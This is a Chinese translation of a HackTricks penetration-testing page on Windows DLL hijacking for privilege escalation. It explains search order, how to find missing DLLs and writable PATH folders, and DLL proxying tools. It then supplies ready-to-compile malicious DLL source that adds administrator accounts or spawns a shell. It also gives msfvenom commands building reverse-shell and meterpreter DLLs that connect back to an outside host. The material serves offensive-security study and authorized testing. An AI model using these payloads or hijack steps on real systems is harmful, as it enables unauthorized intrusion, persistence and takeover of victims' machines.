# DLL劫持

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果你对**黑客职业**感兴趣并想要攻破不可攻破的目标 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

## 定义

首先，让我们先了解一下定义。DLL劫持是指以最广义的意义上，**欺骗一个合法/可信任的应用程序加载任意DLL**。术语如_DLL搜索顺序劫持_、_DLL加载顺序劫持_、_DLL欺骗_、_DLL注入_和_DLL侧加载_经常被错误地用来表示相同的意思。

DLL劫持可以用于**执行**代码、获取**持久性**和**提升权限**。在这三种情况中，**最不可能**发现的是**提升权限**。然而，由于这是权限提升部分的一部分，我将重点介绍这个选项。此外，无论目标是什么，DLL劫持的执行方式都是相同的。

### 类型

有多种方法可供选择，成功与否取决于应用程序配置加载所需DLL的方式。可能的方法包括：

1. **DLL替换**：用恶意DLL替换合法DLL。这可以与_DLL代理_结合使用\[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)]，以确保原始DLL的所有功能保持完整。
2. **DLL搜索顺序劫持**：应用程序指定的没有路径的DLL按照特定顺序在固定位置进行搜索\[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]。通过将恶意DLL放在实际DLL之前进行搜索顺序劫持。这有时包括目标应用程序的工作目录。
3. **幻影DLL劫持**：将恶意DLL放在缺失/不存在的DLL位置，合法应用程序尝试加载该DLL\[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)]。
4. **DLL重定向**：更改搜索DLL的位置，例如通过编辑`%PATH%`环境变量，或`.exe.manifest` / `.exe.local`文件以包含包含恶意DLL的文件夹\[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)]。
5. **WinSxS DLL替换**：在目标DLL的相关WinSxS文件夹中用恶意DLL替换合法DLL。通常称为DLL侧加载\[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)]。
6. **相对路径DLL劫持**：将合法应用程序复制（并可选地重命名）到用户可写入的文件夹中，与恶意DLL放在一起。在使用方式上，它与（签名的）二进制代理执行\[[8](https://attack.mitre.org/techniques/T1218/)]有相似之处。这种方法的变体有点自相矛盾，被称为“_bring your own LOLbin_”\[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)]，其中合法应用程序与恶意DLL一起提供（而不是从受害者机器上的合法位置复制）。

## 查找缺失的DLL

在系统中查找缺失的DLL的最常见方法是运行[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，**设置以下2个过滤器**：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

然后只显示**文件系统活动**：

![](<../../.gitbook/assets/image (314).png>)

如果你正在寻找**一般缺失的DLL**，你可以让它运行**几秒钟**。\
如果你正在寻找**特定可执行文件中缺失的DLL**，你应该设置**另一个过滤器，如"进程名称" "包含" "\<exec name>"**，执行它，并停止捕获事件。
## 利用缺失的 DLL 进行提权

为了提升权限，我们最好的机会是能够**编写一个 DLL，让一个特权进程尝试加载**它在某个**将要被搜索的位置**。因此，我们将能够在一个**在原始 DLL 之前被搜索的文件夹**中**编写**一个 DLL（奇怪的情况），或者我们将能够在一个**将要被搜索的文件夹**中**编写**一个 DLL，而原始的** DLL 在任何文件夹中都不存在**。

### DLL 搜索顺序

**在**[**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**中，你可以找到 DLL 的具体加载方式。**

一般来说，**Windows 应用程序**会使用**预定义的搜索路径来查找 DLL**，并按照特定的顺序检查这些路径。DLL 劫持通常是通过将恶意 DLL 放置在其中一个文件夹中，同时确保该 DLL 在合法 DLL 之前被找到。通过让应用程序指定 DLL 的绝对路径，可以缓解这个问题。

你可以在**32 位系统上**看到 DLL 搜索顺序如下：

1. 应用程序加载的目录。
2. 系统目录。使用[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)函数获取该目录的路径。(_C:\Windows\System32_)
3. 16 位系统目录。没有函数可以获取该目录的路径，但是会进行搜索。(_C:\Windows\System_)
4. Windows 目录。使用[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)函数获取该目录的路径。(_C:\Windows_)
5. 当前目录。
6. 在 PATH 环境变量中列出的目录。请注意，这不包括由**App Paths**注册表键指定的每个应用程序路径。计算 DLL 搜索路径时，不使用**App Paths**键。

这是启用**SafeDllSearchMode**的**默认**搜索顺序。当禁用此功能时，当前目录将升至第二位。要禁用此功能，请创建**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**注册表值，并将其设置为 0（默认启用）。

如果使用[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)函数调用**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**，搜索将从**LoadLibraryEx**正在加载的可执行模块的目录开始。

最后，请注意**DLL 可以通过指定绝对路径而不仅仅是名称来加载**。在这种情况下，该 DLL **只会在该路径中被搜索**（如果 DLL 有任何依赖项，它们将按名称搜索，就像刚加载的一样）。

还有其他改变搜索顺序的方法，但我不会在这里解释它们。

#### Windows 文档中的 DLL 搜索顺序异常

* 如果**已经在内存中加载了具有相同模块名称的 DLL**，系统在解析到已加载的 DLL 之前，仅检查重定向和清单。**系统不会搜索该 DLL**。
* 如果 DLL 在应用程序运行的 Windows 版本的**已知 DLL 列表**中，**系统将使用其自己的已知 DLL 的副本**（以及已知 DLL 的依赖 DLL，如果有的话），**而不是搜索**该 DLL。有关当前系统上已知 DLL 的列表，请参阅以下注册表键：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
* 如果一个 DLL 有依赖项，系统会像只加载它们的**模块名称**一样搜索这些依赖项的 DLL。即使第一个 DLL 是通过指定完整路径加载的，这也是正确的。

### 提升权限

**要求**：

* 找到一个以**其他权限**（水平/横向移动）运行/将要运行的进程，该进程**缺少一个 DLL**。
* 在任何**将要被搜索的文件夹**（可能是可执行文件目录或系统路径中的某个文件夹）上具有**写权限**。

是的，要求很难找到，因为**默认情况下很难找到一个缺少 DLL 的特权可执行文件**，而且**在系统路径文件夹中默认情况下没有写权限**（你不能）。但是，在配置错误的环境中，这是可能的。\
如果你幸运地满足了这些要求，你可以查看[UACME](https://github.com/hfiref0x/UACME)项目。即使该项目的**主要目标是绕过 UAC**，你可能会在那里找到一个适用于你的 Windows 版本的 DLL 劫持的 PoC（可能只需更改你具有写权限的文件夹的路径）。

请注意，你可以通过执行以下操作**检查文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查路径中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
您还可以使用以下命令检查可执行文件的导入项和动态链接库的导出项：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要了解如何滥用Dll劫持以提升权限并具有在系统路径文件夹中写入权限的完整指南，请查看：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自动化工具

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查您是否具有对系统路径中任何文件夹的写入权限。\
其他有趣的自动化工具来发现此漏洞是**PowerSploit函数**：_Find-ProcessDLLHijack_，_Find-PathDLLHijack_和_Write-HijackDll_。

### 示例

如果您找到了一个可利用的场景，成功利用它的最重要的事情之一将是**创建一个导出至少所有可执行文件将从中导入的函数的dll**。无论如何，请注意，Dll劫持在从中间完整性级别升级到高级（绕过UAC）或从高级升级到SYSTEM方面非常方便。您可以在此dll劫持研究中找到一个创建有效dll的示例，该研究专注于用于执行的dll劫持：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
此外，在下一节中，您可以找到一些可能有用作模板或创建具有非必需导出函数的dll的基本dll代码。

## **创建和编译Dlls**

### **Dll代理化**

基本上，**Dll代理**是一种能够在加载时执行恶意代码的Dll，但也能够通过将所有调用传递给真实库来作为预期的方式**公开**和**工作**。

使用工具\*\*\*\*[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)\*\*\*\*或\*\*\*\*[**Spartacus**](https://github.com/Accenture/Spartacus)\*\*\*\*，您实际上可以**指定一个可执行文件并选择要代理化的库**，然后**生成一个代理化的dll**，或者**指定Dll并生成一个代理化的dll**。

### **Meterpreter**

**获取反向shell（x64）：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个meterpreter（x86）：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86 我没有看到 x64 版本）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在多种情况下，你编译的 Dll 必须**导出多个函数**，这些函数将由受害进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，从而导致**攻击失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果你对**黑客职业**感兴趣并想要攻破不可攻破的系统 - **我们正在招聘！**（需要流利的波兰语书写和口语能力）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
